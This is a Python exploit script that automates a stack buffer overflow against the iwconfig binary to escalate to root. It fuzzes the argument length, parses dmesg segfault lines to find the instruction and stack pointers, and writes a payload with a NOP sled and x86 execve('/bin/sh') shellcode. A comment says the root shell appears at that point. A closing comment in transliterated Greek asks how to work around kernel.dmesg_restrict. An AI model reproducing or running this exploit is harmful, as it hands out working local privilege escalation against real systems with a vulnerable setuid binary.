import subprocess
import struct

buffer = b"A"
command = ["iwconfig", buffer.decode()]

while True:
    iwconfig = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout_data, stderr_data = iwconfig.communicate()

    # return code when "no such device" locally: 237
    # return code when "no such device" on docker: 0
    # return code when segfault on docker: -11

    if iwconfig.returncode == -11:
        # print(f"Segmentation fault occurred with buffer length: {len(buffer)}")
        dmesg_command = ["dmesg", "-T"]
        grep_command = ["grep", "segfault"]
        tail_command = ["tail", "-n", "1"]

        dmesg_process = subprocess.Popen(dmesg_command, stdout=subprocess.PIPE)
        grep_process = subprocess.Popen(grep_command, stdin=dmesg_process.stdout, stdout=subprocess.PIPE)
        tail_process = subprocess.Popen(tail_command, stdin=grep_process.stdout, stdout=subprocess.PIPE)

        tail_output, _ = tail_process.communicate()

        dmesg_res = tail_output.decode().split(" ")
        # ip is the 11th token (starting from 0), sp is the 13th

        if dmesg_res[11] != "0000000041414141":
            buffer += b"A"
            command = ["iwconfig", buffer.decode()]
            continue
        else:

            find_sp = b"A" * (len(buffer) - 4) + b"BBBB" + b"C" * 10028
            command = ["iwconfig", find_sp.decode()]
            iwconfig = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout_data, stderr_data = iwconfig.communicate()

            # check where the stack is crushing at
            dmesg_process = subprocess.Popen(dmesg_command, stdout=subprocess.PIPE)
            grep_process = subprocess.Popen(grep_command, stdin=dmesg_process.stdout, stdout=subprocess.PIPE)
            tail_process = subprocess.Popen(tail_command, stdin=grep_process.stdout, stdout=subprocess.PIPE)

            tail_output2, _ = tail_process.communicate()
            dmesg2_res = tail_output2.decode().split(" ")

            sp_hex = int(dmesg2_res[13], 16)
            ret_addr = sp_hex + 5000

            payload = b"A" * (len(buffer) - 4)
            payload += struct.pack("<I", ret_addr)
            payload += b"\x90" * 10000
            payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
            open("payload", "wb").write(payload)

            iwconfig = subprocess.Popen("iwconfig `cat payload`", shell=True)
            return_code = iwconfig.wait() #the root shell happens here, because of wait()
            break
    else:
        buffer += b"A"
        command = ["iwconfig", buffer.decode()]

#provlima giati an einai set to 1 to kernel.dmesg_restrict se ena systima pws tha to kanw? Yparxei allos tropos ektos apo dmesg?